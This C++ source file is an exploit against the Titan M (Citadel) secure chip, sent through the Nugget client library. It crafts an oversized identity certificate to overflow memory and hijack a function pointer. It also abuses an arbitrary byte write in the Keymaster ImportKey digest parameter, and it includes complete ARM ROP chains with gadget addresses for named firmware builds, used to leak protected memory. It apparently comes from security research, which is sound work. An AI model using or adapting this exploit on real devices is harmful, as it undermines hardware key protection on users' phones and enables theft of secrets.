#include <app_nugget.h>
#include <byteswap.h>
#include <log.h>
#include <nos/NuggetClient.h>
#include <nos/device.h>
#include <nostypes.h>
#include <nosutils.h>
#include <nugget/app/identity/identity.pb.h>
#include <rop.h>
#include <string.h>
#include <unistd.h>
#include <utils.h>

#include <cassert>
#include <fstream>

using namespace nostypes;
using nos::NuggetClient;

static NosCmd *generate_payload() {
  nugget::app::identity::ICpushReaderCertRequest *request =
      new nugget::app::identity::ICpushReaderCertRequest();
  nugget::app::identity::ICpushReaderCertResponse *response =
      new nugget::app::identity::ICpushReaderCertResponse();

  size_t ic_struct_len = 328;
  // overwrite IC_struct + init_stack + final function pointer
  size_t cert_size = ic_struct_len + init_stack_size + 4;

  char x509Cert[cert_size];
  // overwrite all the IC_STRUCT
  memset(x509Cert, 0xff, ic_struct_len);

  // task_ready
  *(uint32_t *)(x509Cert + ic_struct_len) = 2;

  // task_enabled (idle, hook, nugget, avb)
  *(uint32_t *)(x509Cert + ic_struct_len + 4) = 1 + 2 + 4 + 16;

  // rest of the bytes from init_stack
  memcpy(x509Cert + ic_struct_len + 8, init_stack + 8, init_stack_size - 8);

  // overwrite nugget.request_buf with value of $sp when avb_GetState is called
  *(uint32_t *)(x509Cert + ic_struct_len + 0x24) = 0x12844;

  // replace avb_GetState callbacks
  uint32_t avb_GetState_new =
      0x58e03;  // add sp, #0x19c; pop {r4, r5, r6, r7, pc};
  *(uint32_t *)(x509Cert + ic_struct_len + init_stack_size) = avb_GetState_new;

  // important to set the size here, otherwise the internal copy will stop at
  // the first null char
  request->set_x509cert(x509Cert, cert_size);
  request->set_publickeyoffset(0);
  request->set_publickeysize(cert_size);

  NosCmd *cmd = new NosCmd(13, "", request, response);
  return cmd;
}

int ICpushReaderCert_exploit(std::vector<uint8_t> request,
                             std::vector<uint8_t> &result, bool reset) {
  NosCmd *cmd = generate_payload();

  // init the client
  NuggetClient client(CITADEL_DEV);
  uint32_t rv;
  client.Open();

  if (!client.IsOpen()) exit(1);

  const nos_device &device = *client.Device();

  if (reset) {
    // reset device before starting to mess with it
    device.ops.reset(device.ctx);
  }

  std::vector<uint8_t> vecres;
  vecres.resize(MAX_RESPONSE_SIZE);

  // send exploit
  // convert request to vector<uint8_t>
  std::string sreq;
  cmd->request->SerializeToString(&sreq);
  std::vector<uint8_t> vecreq(sreq.begin(), sreq.end());

  // call nos lib
  rv = client.CallApp(5, cmd->id, vecreq, &vecres);

  std::string response_str(vecres.begin(), vecres.end());
  cmd->reply->ParseFromString(response_str);

  vecres.clear();
  vecres.resize(MAX_RESPONSE_SIZE);

  rv = client.CallApp(0, 0x4242, request, &vecres);

  // call AVB GetState, which contains our first gadget
  vecreq.clear();
  result.clear();
  result.resize(MAX_RESPONSE_SIZE);

  rv = client.CallApp(1, 0, vecreq, &result);

  // print result
  print_vector(result);

  // close the client
  client.Close();
  delete (cmd);

  return 0;
}

// works for 0.0.3/brick_v0.0.8232-b1e3ea340 2020-09-25 16:57:52 wfrichar
int leak_data(uint32_t addr, uint32_t size, bool reset) {
  // function printing some runtime data, useful to debug ROPchains
  uint32_t print_stats = 0x467b1;

  // first gadget: add sp, #0x19c; pop {r4, r5, r6, r7, pc};
  uint32_t regs[] = {

      // memcpy addr (53209) to read in 0x17ee0 (AVB_RESPONSE)
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk
      0x41414141,  // r7 = junk

      0x4f965,  // pc = pop {r0, r4, r5, r6, pc};

      0x17ee0,     // r0 = AVB_RESPONSE
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk

      0x515e3,  // pc = pop {r1, r2, r3, r4, r5, pc};

      addr,        // r1 = start address
      size,        // r2 = leak size
      0x633e9,     // r3 = memcpy
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk

      0x4fe65,  // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};

      0x41414141,  // r3 = junk
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x4f965,     // pc = pop {r0, r4, r5, r6, pc};

      0x1df48,     // r0 = AVB_STRUCT
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk

      0x515e3,  // pc = 0x0000d5e2 (0x0000d5e3): pop {r1, r2, r3, r4, r5, pc};

      0x0,         // r1 = status
      size,        // r2 = leak size
      0x50799,     // r3 = app_reply
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk

      0x4fe65,  // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};

      0x0,          // r3 = junk
      0x41414141,   // r4 = junk
      0x41414141,   // r5 = junk
      print_stats,  // pc = valid func
  };

  uint32_t payload_size = sizeof(regs);

  std::vector<uint8_t> request(payload_size * sizeof(uint32_t));
  request.assign((uint8_t *)regs,
                 ((uint8_t *)regs) + payload_size * sizeof(uint32_t));

  std::vector<uint8_t> result;
  uint32_t res = ICpushReaderCert_exploit(request, result, reset);

  return res;
}

std::vector<uint8_t> *get_mem_words(uint32_t addr, uint32_t size) {

  uint32_t memcpy_addr = 0x53493;

  uint32_t mem_words[] = {
      0x101c8,     // r3
      0x0,
      0x46029,     // pop {r4, pc};
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      
      // here the copied ROPchain starts
      0x0,
      0x0,
      /*
      Here is where code exec starts in the context of the command handler.
      In this case, we have a classic ROP chain. What we want to do is:
      - memcpy what we want to leak in Keymaster response buffer
      - set size of keymaster response
      - call app_reply with the right arguments, like the handler would
      - jump back to keymaster_parse_cmd to resume normal execution
      */
      0x54bf1,     // pop {r0, r1, r2, r3, r5, pc};
      0x18ac8,     // r0 = memcpy dst = keymaster response buffer
      addr,        // r1 = memcpy src = RW_A header
      size,        // r2 = size
      memcpy_addr, // r3 = memcpy
      0x0,         // r5
      0x4f78d,     // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};
      0x500c5,     // r3 = app_reply
      size,        // r4 = what we want to store
      0x0,         // r5
      0x47e31,     // pop {r0, r2, r7, pc};
      0x1e20a,     // r0 = where we want to store - 0x20 = keymaster response buffer length - 0x20
      0x0,         // r2
      0x0,         // r7
      0x470a1,     // strh r4, [r0, #0x20]; pop {r4, r5, r6, pc};
      0x0,         // r4
      0x0,         // r5
      0x0,         // r6
      0x54bf1,     // pop {r0, r1, r2, r3, r5, pc};
      0x1e218,     // r0 = keymaster_spi_data
      0x0,         // r1 = return code
      size,        // r2 = size
      0x500c5,     // r3 = app_reply
      0x0,         // r5
      0x4f78d,     // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};
      0x0,         // r3
      0x0,         // r4
      0x0,         // r5
      0x64a45,     // right after keymaster_parse_cmd
      0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
      0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
      0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,

      /*
      Here starts the second pass of our exploit, where we want to achieve 3 things:
      - replace the DestroyAttestationIds cmd handler
      - memcpy to the stack above the handler, to finish the attack when the handler is executed
      - store one single gadget on the handler's stack, to reach what we just memcpy'd
      */
      0x0,         // -> r4
      0x48b0b,     // -> pop {r1, r2, r4, r7, pc};
      0x1df20,     // -> r1 = where we want to store = the address of the cmd handler
      0x80,        // -> r2 = memcpy size (for later)
      0x47697,     // -> r4/r0 = what we want to store = pop {r4, r5, pc};
      0x0,         // -> r7
      0x46027,     // -> mov r0, r4; pop {r4, pc};
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r4
      0x5d45f,     // -> str r0, [r1]; pop {r4, r5, pc};
      0x14d10,     // -> r4/r0 = memcpy dst = at the edge of Keymaster's stack
      0x0,         // -> r5
      0x5172b,     // -> pop {r1, r5, pc};
      0x10208,     // -> r1 = memcpy src = the ROPchain above
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r5
      0x46027,     // -> mov r0, r4; pop {r4, pc};
      0x0,         // -> r4
      0x49a1b,     // -> pop {r3, pc};
      memcpy_addr, // -> r3 = memcpy
      0x4f78d,     // -> blx r3; mov r0, r4; pop {r3, r4, r5, pc};
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r3
      0x0,         // -> r4
      0x0,         // -> r5
      0x48e85,     // -> pop {r0, r1, r3, r4, r6, pc};
      0x649e5,     // -> r0 = what we want to store = addw sp, sp, #0x878; pop {r4, r5, r6, pc};
      0x14490,     // -> r1 = where we want to store = the untouched address in the stack
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r3
      0x0,         // -> r4
      0x0,         // -> r6
      0x46029,     // -> pop {r4, pc};
      0x0,         // -> r4
      0x5d45f,     // -> str r0, [r1]; pop {r4, r5, pc};
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r4
      0x0,         // -> r5
      0x48b0b,     // -> pop {r1, r2, r4, r7, pc};
      0x0,         // -> r1
      0x0,         // -> r2
      0x0,         // r4 -> r4
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r7
      0x4b493,     // -> pop {r1, r2, r4, r5, r7, pc};

      /*
      "entry point" of the exploit.
      First we climb up the stack with the only "sub sp" gadget in the firmware.
      We call it several times, until we have enough space to write the ROP chain doing what we need.
      Then we walk through the same gadgets in the opposite direction, without touching
      the ones we needed for the first step.
      Comments report which register will take the value (or what gadget the address corresponds to).
      Those starting with "->" show the value taken at the second pass.
      */
      0x46029,     // pop {r4, pc}; -> r1
      0x101c8,     // r4/r0, where we are going to be reading from -> r2
      0x46027,     // mov r0, r4; pop {r4, pc}; -> r4
      0x101c8,     // r4/r0, where we are going to be reading from -> r5
      0x4d1f9,     // sub sp, #0x20; mov r4, r0; ldr r3, [r0]; add.w r5, r4, #0x70; ldr r3, [r3, #8]; blx r3; -> r7
      0x584b9,     // -> pop {r0, r2, r3, r4, r5, r6, pc};
      0x0,         // -> r0
      0x0,         // -> r2
      0x0,         // -> r3
      0x0,         // -> r4
      0x0,         // -> r5
      0x0,         // -> r6
  };

  std::vector<uint8_t> *vecreq = new vector<uint8_t>;
  vecreq->assign((uint8_t *)mem_words,
                 ((uint8_t *)mem_words + sizeof(mem_words)));
  // print_vector(*vecreq);

  return vecreq;
}

// for 0.0.3/chunk_ab7976980-a9084b7 2021-12-07 18:40:23 android-build
int leak_data_v2(uint32_t addr, uint32_t size, bool reset) {
  // init the client
  NuggetClient client(CITADEL_DEV);
  uint32_t rv;
  client.Open();

  if (!client.IsOpen()) exit(1);

  const nos_device &device = *client.Device();

  if (reset) {
    // reset device before starting to mess with it
    device.ops.reset(device.ctx);
  }

  // the base address for the arbitrary write
  uint32_t base = 0x14019;
  // the target byte that we want to write:
  // a byte in the address where Keymaster commands will be stored
  uint32_t target_byte = 0x1e21d;

  nugget::app::keymaster::ImportKeyRequest *request =
      new nugget::app::keymaster::ImportKeyRequest();

  nugget::app::keymaster::KeyParameters *params =
      new nugget::app::keymaster::KeyParameters();

  nugget::app::keymaster::KeyParameter *param = params->add_params();
  param->set_tag(nugget::app::keymaster::ALGORITHM);
  param->set_integer(nugget::app::keymaster::HMAC);

  param = params->add_params();
  param->set_tag(nugget::app::keymaster::DIGEST);
  param->set_integer(target_byte - base);

  param = params->add_params();
  param->set_tag(nugget::app::keymaster::DIGEST);
  param->set_integer(4);

  param = params->add_params();
  param->set_tag(nugget::app::keymaster::MIN_MAC_LENGTH);
  param->set_integer(0x100);

  request->set_allocated_params(params);

  nugget::app::keymaster::SymmetricKey *key =
      new nugget::app::keymaster::SymmetricKey();
  // just random data
  key->set_material("PDFoNQNImkCb");
  request->set_allocated_symmetric_key(key);

  // convert request to vector<uint8_t>
  std::string sreq;
  request->SerializeToString(&sreq);
  std::vector<uint8_t> vecreq(sreq.begin(), sreq.end());

  // call nos lib
  rv = client.CallApp(App::Keymaster, KeymasterCmdsId::ImportKey, vecreq,
                      nullptr);

  std::vector<uint8_t> *exploit_request = get_mem_words(addr, size);

  std::vector<uint8_t> response;
  response.clear();
  response.resize(MAX_RESPONSE_SIZE);

  // write in the new buffer, placing a new address in one of the stored PCs
  // the message we send here doesn't matter, as long as it is a Keymaster one

  rv = client.CallApp(App::Keymaster, KeymasterCmdsId::DestroyAttestationIds,
                      *exploit_request, &response);
  // cout << "DestroyAttestationIds return value: " << rv << endl;
  // cout << "Response: (size = " << response.size() << ")" << endl;
  print_vector(response);

  // close the client
  client.Close();
  delete request;
  delete exploit_request;

  return rv;
}

int write_byte(uint32_t target_byte) {
  // the base address for the arbitrary write
  uint32_t base = 0x14019;
  if (target_byte < base) {
    cerr << "Target byte cannot be smaller than 0x" << hex << base << dec
         << endl;
    return 1;
  }

  uint32_t offset = target_byte - base;
  uint16_t masked = offset & 0xff;
  if ((4 < masked) || ((1 << masked & 0x15) == 0)) {
    cout << "Warning: This value will not pass the checks in the vulnerable "
            "function!"
         << endl;
  }

  // init the client
  NuggetClient client(CITADEL_DEV);
  uint32_t rv;
  client.Open();

  if (!client.IsOpen()) exit(1);

  const nos_device &device = *client.Device();
  // reset device before starting to mess with it
  device.ops.reset(device.ctx);

  nugget::app::keymaster::ImportKeyRequest *request =
      new nugget::app::keymaster::ImportKeyRequest();

  nugget::app::keymaster::KeyParameters *params =
      new nugget::app::keymaster::KeyParameters();

  nugget::app::keymaster::KeyParameter *param = params->add_params();
  param->set_tag(nugget::app::keymaster::ALGORITHM);
  param->set_integer(nugget::app::keymaster::HMAC);

  param = params->add_params();
  param->set_tag(nugget::app::keymaster::DIGEST);
  param->set_integer(offset);

  request->set_allocated_params(params);

  nugget::app::keymaster::SymmetricKey *key =
      new nugget::app::keymaster::SymmetricKey();
  // just random data
  key->set_material("PDFoNQNImkCb");
  request->set_allocated_symmetric_key(key);

  request->PrintDebugString();

  // convert request to vector<uint8_t>
  std::string sreq;
  request->SerializeToString(&sreq);
  std::vector<uint8_t> vecreq(sreq.begin(), sreq.end());

  // call nos lib
  rv = client.CallApp(App::Keymaster, KeymasterCmdsId::ImportKey, vecreq,
                      nullptr);

  cout << "Return value: " << rv << endl;

  // close the client
  client.Close();
  delete request;

  return 0;
}
